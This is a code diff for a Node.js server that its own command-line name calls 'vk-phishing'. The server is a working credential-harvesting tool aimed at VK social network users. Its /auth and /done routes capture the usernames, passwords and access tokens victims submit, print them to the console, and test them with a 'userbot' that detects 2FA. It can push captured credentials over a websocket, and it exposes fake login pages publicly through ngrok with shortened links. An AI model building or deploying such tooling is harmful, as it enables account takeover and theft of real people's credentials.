@@ -1,86 +1,164 @@
-const { existsSync } = require('fs')
-const { join } = require('path')
+const yargs = require('yargs')
 
-const express = require('express')
 const consola = require('consola')
 
-const app = express()
-const bodyParser = require('body-parser')
+const Koa = require('koa')
+const Router = require('@koa/router')
+const bodyParser = require('koa-bodyparser')
 
-const config = require('../nuxt.config')
+const { VK } = require('vk-io')
+const io = require('socket.io')()
+
+const chalk = require('chalk')
+const userbot = require('./userbot')
+const { R_SUCCESS, R_REQUIRE_2FA } = require('./auth-constants')
 const ngrok = require('./ngrok')
 
+const app = new Koa()
+const router = new Router()
+
 // Import and Set Nuxt.js options
-config.dev = process.env.NODE_ENV !== 'production'
 
 const { getShortUrl, afterLogin } = require('./aye-kosmonavt-yaml')
 
-async function start(r) {
-  // Init Nuxt.js
+async function start(args) {
+  app.use(bodyParser())
 
-  let rendererPath = `./renderers/${r}`
+  const renderers = require('./renderers/index')
 
-  if (
-    !existsSync(join(__dirname, rendererPath + '.js')) ||
-    typeof r !== 'string'
-  ) {
-    rendererPath = `./renderers/default`
-    consola.error({
-      message: `Renderer ${r} not found, used default instead`,
-      badge: true
-    })
-  } else {
-    consola.success(`Used renderer: ${r}`)
+  if (args.listRenderers) {
+    consola.info('Renderers: ')
+
+    let i = 0
+
+    for (const r of Object.keys(renderers)) {
+      consola.log(`${++i}) ${r}`)
+    }
+
+    return 0
   }
 
-  const server = require(rendererPath)
+  if (!(args.renderer in renderers)) {
+    throw new Error(`Renderer ${args.renderer} is not exists`)
+  }
 
-  const { host, port, renderer } = await server()
+  const { port, host, renderer } = await renderers[args.renderer]()
 
-  // Give nuxt middleware to express
+  router.post('/done', async (ctx) => {
+    const vk = new VK({
+      token: ctx.request.body.token,
+      apiVersion: '5.103',
+      apiHeaders: {
+        'User-Agent': ctx.headers['user-agent'] || 'vkApi/1.0'
+      }
+    })
 
-  app.post('/auth', bodyParser.json(), require('./hooks/auth'))
+    const [currentUser] = await vk.api.users.get()
 
-  app.post('/done', bodyParser.json(), require('./hooks/done'))
+    consola.info({ message: 'Got new account', badge: true })
+    consola.info(`Name: ${currentUser.first_name} ${currentUser.last_name}`)
+    consola.info(`Login: ${ctx.request.body.username}`)
+    consola.info(`Password: ${ctx.request.body.password}`)
+    if (ctx.req['2fa']) {
+      consola.error('2fa: Enabled')
+    } else {
+      consola.success('2fa: Disabled')
+    }
+    consola.info(`Token: ${ctx.request.body.token}`)
 
-  app.get('/exit', async (_uReq, res) => res.redirect(await afterLogin()))
+    if (args.websocket)
+      io.sockets.emit('user_successful_auth', {
+        ...currentUser,
+        ...ctx.request.body
+      })
 
-  app.use(renderer)
+    ctx.body = 'ok'
+  })
 
-  // Listen the server
-  app.listen(port, host)
+  router.post('/auth', async (ctx) => {
+    consola.log()
+
+    consola.info({
+      label: true,
+      message: 'Trying authenticate with credentials'
+    })
+
+    const input = chalk.bold.blueBright('>')
+    const outputSuccess = chalk.bold.green('< ')
+    const outputFail = chalk.bold.red('< ')
+
+    consola.log(`${input} Login: ${ctx.request.body.username}`)
+    consola.log(`${input} Password: ${ctx.request.body.password}`)
+
+    const json = await userbot(ctx.request.body)
+
+    if (json.status === R_SUCCESS) {
+      consola.log(outputSuccess + 'Success!')
+    } else if (json.status === R_REQUIRE_2FA) {
+      consola.log(outputFail + 'Required 2FA!')
+    } else {
+      consola.log(outputFail + 'Failed!')
+    }
+
+    consola.log()
+
+    if (args.websocket) io.sockets.emit('user_auth_try', json)
+
+    ctx.body = json
+  })
+
+  router.get('/exit', async (ctx) => ctx.redirect(await afterLogin()))
 
   consola.ready({
     message: `Server listening on http://${host}:${port}`,
     badge: true
   })
 
-  if (config.dev) {
-    consola.info(`Listening dev url: http://${host}:${port}`)
-  } else {
+  if (args.ngrok) {
     try {
       const publicUrl = await ngrok(port)
-
       consola.info(`Listening public url: ${publicUrl}`)
-
       const shortUrl = await getShortUrl(publicUrl)
-
       consola.info(`Shorten url is: ${shortUrl}`)
+
+      if (args.websocket) {
+        io.sockets.emit('ngrok_connected', { publicUrl, shortUrl })
+      }
     } catch (e) {
+      if (args.websocket) {
+        io.sockets.emit('ngrok_fail_start', e)
+      }
+
       consola.error(e)
     }
   }
+
+  app.use(router.routes())
+  app.use(router.allowedMethods())
+  app.use(renderer)
+
+  app.listen(port, host)
+
+  if (args.websocket) {
+    const wsPort = port + 100
+
+    io.listen(wsPort)
+
+    consola.ready({
+      message: `WebSocket server listening on ws://localhost:${wsPort}`,
+      badge: true
+    })
+  }
 }
 
-let renderer
-
-if (config.dev) {
-  renderer = 'default'
-} else {
-  renderer = 'generated'
-}
-
-start(renderer)
+start(
+  yargs
+    .scriptName('vk-phishing')
+    .alias('l', 'list-renderers')
+    .alias('r', 'renderer')
+    .alias('ws', 'websocket')
+    .default('r', 'static').argv
+)
 
 process
   .on('unhandledRejection', (reason, p) => {
